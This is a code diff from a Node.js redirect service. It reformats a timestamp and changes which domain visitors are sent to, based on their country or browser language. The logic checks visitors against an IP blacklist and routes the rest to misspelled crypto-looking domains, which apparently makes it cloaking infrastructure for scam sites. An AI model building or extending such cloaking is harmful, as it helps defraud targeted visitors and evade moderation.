@@ -24,7 +24,13 @@ module.exports.getUrl = async function (req, res) {
         }
         const allBlackIp = await Ip.find({})
         const block = parceIpForCompare(ip, allBlackIp);
-        let date = new Date(Date.now()).toString();
+        let date = new Date(Date.now()).getFullYear() + '-' +
+            ("0" + (new Date(Date.now()).getMonth() + 1)).slice(-2) + '-' +
+            ("0" + (new Date(Date.now()).getDate())).slice(-2) + ' ' +
+            ("0" + new Date(Date.now()).getHours()).slice(-2) + ':' +
+            ("0" + new Date(Date.now()).getMinutes()).slice(-2) + ':' +
+            ("0" + new Date(Date.now()).getSeconds()).slice(-2);
+
         if (block) {
             const user = new User({
                 UserAgent: req.body.UserAgent,
@@ -105,15 +111,15 @@ function checkCountry(ip, language) {
             case "SG":
                 url = 'bitcoinunuion.info'
                 break
-            case "PL":
-                url = 'mafxgemoieger.info'
-                break
-            case "RU":
-                url = 'mafxgemoieger.info'
-                break
-            case "UA":
-                url = 'mafxgemoieger.info'
-                break
+            // case "PL":
+            //     url = 'mafxgemoieger.info'
+            //     break
+            // case "RU":
+            //     url = 'mafxgemoieger.info'
+            //     break
+            // case "UA":
+            //     url = 'mafxgemoieger.info'
+            //     break
             default:
                 url = null;
                 break
@@ -125,7 +131,8 @@ function checkCountry(ip, language) {
             language.toUpperCase() ==='UA' ||
             language.toUpperCase() ==='RU-UA' ||
             language.toUpperCase() ==='PL') {
-            url = 'mafxgemoieger.info'
+            // url = 'mafxgemoieger.info'
+            url = 'bitcoinunuion.info'
             } else {
             reason = 'Invalid language'
             url = null
